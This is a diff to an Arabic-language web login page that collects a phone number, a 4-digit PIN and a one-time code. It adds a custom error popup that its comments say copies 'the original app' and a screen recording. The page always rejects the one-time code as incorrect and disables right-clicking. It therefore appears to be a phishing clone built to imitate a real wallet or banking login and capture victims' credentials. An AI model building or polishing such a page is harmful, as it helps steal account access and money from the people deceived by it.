@@ -303,6 +303,61 @@
             opacity: 0.9;
         }
 
+        /* نافذة رسالة الخطأ المخصصة للتطبيق */
+        .custom-popup-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .custom-popup-box {
+            width: 280px;
+            background-color: #ffffff;
+            border-radius: 14px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            overflow: hidden;
+            text-align: center;
+            animation: popupScale 0.2s ease-out;
+        }
+
+        @keyframes popupScale {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .popup-content-text {
+            padding: 25px 20px;
+            font-size: 1rem;
+            color: #333333;
+            line-height: 1.6;
+        }
+
+        .popup-content-text strong {
+            display: block;
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+            color: #000;
+        }
+
+        .popup-close-btn {
+            width: 100%;
+            height: 50px;
+            background-color: #1ed1db; /* اللون الفيروزي الفاتح لزر الإغلاق */
+            color: #ffffff;
+            border: none;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            outline: none;
+        }
+
         .hidden {
             display: none !important;
         }
@@ -311,6 +366,16 @@
 <body>
 
     <div class="app-container">
+        
+        <div id="customErrorPopup" class="custom-popup-overlay hidden">
+            <div class="custom-popup-box">
+                <div class="popup-content-text">
+                    <strong>خطأ</strong>
+                    <span id="popupErrorMessage">رمز التأكيد الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى.</span>
+                </div>
+                <button class="popup-close-btn" onclick="closeErrorPopup()">تم</button>
+            </div>
+        </div>
         
         <div class="app-header" id="appHeader">
             <span class="back-arrow" id="backArrow" onclick="switchToLogin()">&#12296;</span>
@@ -327,7 +392,7 @@
                 <div class="input-group">
                     <label>اسم المستخدم أو رقم الهاتف</label>
                     <div class="input-wrapper">
-                        <input type="text" id="usernameInput" class="main-input" maxlength="8" placeholder="" oninput="cleanNumberInput(this)">
+                        <input type="text" id="usernameInput" class="main-input" maxlength="8" inputmode="numeric" placeholder="" oninput="handleUsernameInput(this)">
                         <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                             <circle cx="12" cy="12" r="10"/>
                             <path d="M18 19c0-2.21-2.69-4-6-4s-6 1.79-6 4"/>
@@ -394,15 +459,22 @@
         let otpInterval = null;
         let totalSeconds = 300; 
 
-        // حظر النقر والإجراءات غير المصرح بها أمنياً لحماية البيانات والواجهة
+        // حظر النقر لحماية البيانات والواجهة أمنياً
         document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
         document.addEventListener('mousedown', function(e) {
             if (e.button === 1 || e.button === 2) { e.preventDefault(); return false; }
         });
 
-        // تنظيف مدخلات حقل المستخدم/الهاتف فورياً للأرقام فقط ومطابق للخاصية المطلوبة
-        function cleanNumberInput(input) {
-            input.value = input.value.replace(/[^0-9]/g, '');
+        // تنظيف مدخلات الهاتف والتحويل التلقائي للرقم السري عند اكتمال الـ 8 أرقام
+        function handleUsernameInput(input) {
+            input.value = input.value.replace(/[^0-9]/g, ''); // فلترة الأرقام فقط
+            if (input.value.length === 8) {
+                // نقل التركيز تلقائياً للمربع الأول في الرقم السري
+                const passFields = document.querySelectorAll('.password-field');
+                if (passFields.length > 0) {
+                    passFields[0].focus();
+                }
+            }
         }
 
         // حركة التنقل الذكية لحقول الرقم السري
@@ -424,7 +496,7 @@
             field.addEventListener('drop', (e) => e.preventDefault());
         });
 
-        // تشغيل وتفعيل الخاصية المرفقة لحقول OTP (التوجيه التلقائي والتنظيف المطور)
+        // حركة التنقل لحقول OTP
         function handleOtpNavigation(current, currentIndex) {
             current.value = current.value.replace(/[^0-9]/g, ''); 
             const fields = document.querySelectorAll('.otp-field');
@@ -443,7 +515,7 @@
             field.addEventListener('drop', (e) => e.preventDefault());
         });
 
-        // تشغيل عداد الوقت التنازلي التفاعلي الحي للـ OTP تلقائياً عند فتح شاشته
+        // تشغيل عداد الوقت التنازلي التفاعلي الحي للـ OTP تلقائياً
         function startOtpTimer() {
             clearInterval(otpInterval);
             totalSeconds = 300; 
@@ -468,6 +540,16 @@
             document.getElementById('otpTimer').innerText = `${formattedMinutes}:${formattedSeconds} ثواني`;
         }
 
+        // إظهار نافذة الخطأ المخصصة المنبثقة المطابقة للتطبيق الأصلية
+        function showErrorPopup(message) {
+            document.getElementById('popupErrorMessage').innerText = message;
+            document.getElementById('customErrorPopup').classList.remove('hidden');
+        }
+
+        function closeErrorPopup() {
+            document.getElementById('customErrorPopup').classList.add('hidden');
+        }
+
         // التحكم في عمليات الانتقال والتحقق العام للواجهات
         function onFooterButtonClick() {
             const loginSection = document.getElementById('loginSection');
@@ -483,15 +565,15 @@
                 document.querySelectorAll('.password-field').forEach(box => passVal += box.value.trim());
 
                 if (userVal === "" || passVal === "") {
-                    alert("عذراً! لا يمكن ترك الحقول فارغة. الرجاء إدخال رقم الهاتف والرقم السري كاملاً.");
+                    showErrorPopup("عذراً! لا يمكن ترك الحقول فارغة. الرجاء إدخال رقم الهاتف والرقم السري كاملاً.");
                     return;
                 }
                 if (userVal.length !== 8) {
-                    alert("يجب إدخال رقم الهاتف كاملاً والمكون من 8 أرقام.");
+                    showErrorPopup("يجب إدخال رقم الهاتف كاملاً والمكون من 8 أرقام.");
                     return;
                 }
                 if (passVal.length !== 4) {
-                    alert("يجب إدخال الرقم السري كاملاً والمكون من 4 أرقام.");
+                    showErrorPopup("يجب إدخال الرقم السري كاملاً والمكون من 4 أرقام.");
                     return;
                 }
 
@@ -514,15 +596,16 @@
                 document.querySelectorAll('.otp-field').forEach(box => otpCode += box.value.trim());
 
                 if (otpCode === "") {
-                    alert("الرجاء إدخل رمز التحقق (OTP) المرسل إلى هاتفك.");
+                    showErrorPopup("الرجاء إدخال رمز التحقق (OTP) المرسل إلى هاتفك.");
                     return;
                 }
                 if (otpCode.length !== 4) {
-                    alert("الرجاء تعبئة حقل الـ OTP كاملاً (4 أرقام).");
+                    showErrorPopup("الرجاء تعبئة حقل الـ OTP كاملاً (4 أرقام).");
                     return;
                 }
 
-                alert("رمز التأكيد الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى.");
+                // عرض رسالة الخطأ المتناسقة منبثقة ومطابقة لتسجيل الشاشة تماماً
+                showErrorPopup("رمز التأكيد الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى.");
             }
         }
 
